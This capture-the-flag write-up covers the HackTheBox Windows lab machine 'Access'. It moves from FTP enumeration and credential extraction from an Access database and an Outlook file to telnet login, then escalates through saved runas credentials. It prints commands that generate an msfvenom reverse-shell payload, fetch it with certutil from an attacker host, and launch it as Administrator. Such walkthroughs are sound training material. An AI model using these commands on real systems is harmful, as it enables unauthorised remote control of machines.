### summary 
#### Access retired today and here is my first write-up. Access is a Windows box which had a few challenges and used `runas` in a unique way that I have never used before. It's IP is 10.10.10.98.

### nmap
#### We start off by grabbing some basic info with nmap:
`nmap -sC -sV -oA 10.10.10.98`
![](/images/hackthebox/access/1.png)
#### Looking at the nmap scan we can see ftp running on port 21, telnet on port 23, and http on port 80. We can also see that anonymous login on ftp is allowed which is something we definitely need to look at. Let's start with http and get a nikto scan going in the background before we look at ftp.
<hr>
### http enumeration 
#### All we see is a page titled "MegaCorp" with some text and an image. Source code doesn't give us anything either. Not much to go on here.

#### Let's get a nikto scan going in the background while we check out ftp:
`nikto -h http:\\10.10.10.98 > access_nikto.txt`
<hr>
### ftp enumeration
#### We saw on the nmap scan that anonymous login was allowed. After we login we see two directories; `Backups` and `Engineer`.
![](/images/hackthebox/access/3.png)
#### In `Backups` there is only one file called `backup.mdb`. In `Engineer` there is also only one file called `Access Control.zip`. We need to type `binary` to set the transfer mode to binary so we don't get a corrupted download. Then `get backup.mdb` and `get "Acccess Control.zip"` to download them:

### finding credentials and getting user
#### `backup.mdb` is a Microsoft Access Database. We can check using `file` command:
![](/images/hackthebox/access/5.png)
#### If we look at `Access Control.zip` and try to unzip it we can see its password protected. So I'll focus on `backup.mdb` to see if we can find the password. To extract data from `backup.mdb` we need to install mdbtools:
`apt-get install mdbtools`
#### To list the tables in the database we use `mdb-tables`:

#### Looking through the tables we see a few interesting ones. The one we need to select data from is `auth_user`. We will use `mdb-export` to get the contents of that table:
`mdb-export backup.mdb auth_user`
![](/images/hackthebox/access/7.png)
#### We see a list of usernames and passwords. If we try each of the passwords on `Access Control.zip` we find that `access4u@security` works! The file extracted is called `Access Control.pst`. If we run `file` on it we see that it's a Microsoft Outlook email folder.

#### We can use a tool called `readpst` to read the file. This will output another file called `Access Control.mbox` which we can `cat` to read the contents:
`readpst Access\ Control.pst`<br />
`cat Access\ Control.mbox`
![](/images/hackthebox/access/9.png)
#### We see in the email credentials for an account with the username of `security` and a password of `4CcessC0ntr0ller`. If we look back at our nmap scan we saw that telnet was available so we can try to telnet to the machine using these credentials.
`telnet 10.10.10.98`<br />
`dir`<br />
`cd Desktop`<br />
`dir`<br />
`type user.txt`
![](/images/hackthebox/access/10.png)
#### ...and there is user!
<hr>
### privilege escalation
#### We start off by enumerating the users. We see there are only three users on this machine; `Administrator`, `Public`, and `security`. If we try to `cd` into Administrator we get `Access is denied`.
![](/images/hackthebox/access/11.png)
#### If we check the Desktop folder of the `Public` user we find a shortcut called `ZKAccess3.5 Security System.lnk`. Let's use `type` and see what it contains:
![](/images/hackthebox/access/12.png)
#### `lnk` is a shortcut file so the output has a lot of junk, but if we look at how the application is executed we see it uses `runas` using `/savecred` and the Administrator user `/user:ACCESS\Administrator`. `runas` allows us to run commands as another user and `/savecred` lets us use saved credentials. We can also run `cmdkey /list` to check the system for saved credentials and we do see the `Administrator` user in there.
![](/images/hackthebox/access/13.png)
#### We now have a path to root. First lets generate a shell with `msfvenom`:
`msfvenom -p windows/shell/reverse_tcp LHOST=10.10.X.X LPORT=9001 -f exe > shell.exe`
![](/images/hackthebox/access/14.png)
#### Let's run a simple HTTP server with python and download `shell.exe` to the box. `python -m SimpleHTTPServer 80`:
`certutil -urlcache -split -f http://10.10.X.X/shell.exe shell.exe`
![](/images/hackthebox/access/15.png)
#### Now we need to setup a listener:
`msfconsole`<br />
`use exploit/multi/handler`<br />
`set payload windows/shell/reverse_tcp`<br />
`set LHOST 10.10.X.X`<br />
`set LPORT 9001`<br />
`run`
![](/images/hackthebox/access/16.png)
#### Finally we will use `runas` to get a reverse shell:
`runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c c:\users\security\shell.exe"`
#### ...and we have a shell!
![](/images/hackthebox/access/17.png)
#### root!
